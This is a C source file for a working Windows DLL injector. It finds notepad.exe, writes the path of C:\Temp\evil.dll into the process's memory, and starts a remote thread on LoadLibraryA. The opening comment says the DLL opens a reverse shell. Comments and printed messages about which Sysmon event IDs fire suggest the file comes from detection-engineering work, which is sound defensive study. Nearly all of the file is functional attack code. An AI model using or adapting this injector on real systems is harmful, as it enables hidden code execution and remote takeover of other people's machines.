// create revshell in evil.dll
#include "common.h"

int main() {
    const char* dllPath = "C:\\Temp\\evil.dll";
    SIZE_T dllPathLen = strlen(dllPath) + 1;

    DWORD pid = GetPID(L"notepad.exe");
    if (!pid) {
        wprintf(L"[-] notepad.exe not found\n");
        return 1;
    }
    wprintf(L"[*] Target PID: %lu\n", pid);

    // Minimum rights for DLL injection
    DWORD accessMask = PROCESS_VM_WRITE          |
                       PROCESS_VM_OPERATION      |
                       PROCESS_CREATE_THREAD     |
                       PROCESS_QUERY_LIMITED_INFORMATION;

    // Debug — print exact requested mask
    wprintf(L"[+] Requested access mask: 0x%08X\n", accessMask);

    // EID 10 fires here — GrantedAccess 0x102a
    HANDLE hProc = OpenProcess(accessMask, FALSE, pid);
    if (!hProc) {
        wprintf(L"[-] OpenProcess failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Handle acquired\n");

    LPVOID remoteMem = VirtualAllocEx(
        hProc, NULL, dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (!remoteMem) {
        wprintf(L"[-] VirtualAllocEx failed\n");
        return 1;
    }
    wprintf(L"[+] Remote memory allocated: 0x%p\n", remoteMem);

    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, dllPath, dllPathLen, &written)) {
        wprintf(L"[-] WriteProcessMemory failed\n");
        return 1;
    }
    wprintf(L"[+] DLL path written: %zu bytes\n", written);

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"), "LoadLibraryA"
    );
    if (!loadLibAddr) {
        wprintf(L"[-] Failed to get LoadLibraryA address\n");
        return 1;
    }
    wprintf(L"[+] LoadLibraryA at: 0x%p\n", loadLibAddr);

    // EID 8 fires here — StartModule: kernel32.dll
    HANDLE hThread = CreateRemoteThread(
        hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLibAddr,
        remoteMem,
        0, NULL
    );
    if (!hThread) {
        wprintf(L"[-] CreateRemoteThread failed: %lu\n", GetLastError());
        return 1;
    }
    wprintf(L"[+] Remote thread created\n");
    wprintf(L"[*] EID 8 StartModule should show kernel32.dll\n");
    wprintf(L"[*] EID 7 should fire when DLL loads into notepad\n");
    wprintf(L"[*] EID 10 should show 0x102a for injector→notepad\n");

    WaitForSingleObject(hThread, 5000);
    CloseHandle(hThread);
    CloseHandle(hProc);
    return 0;
}
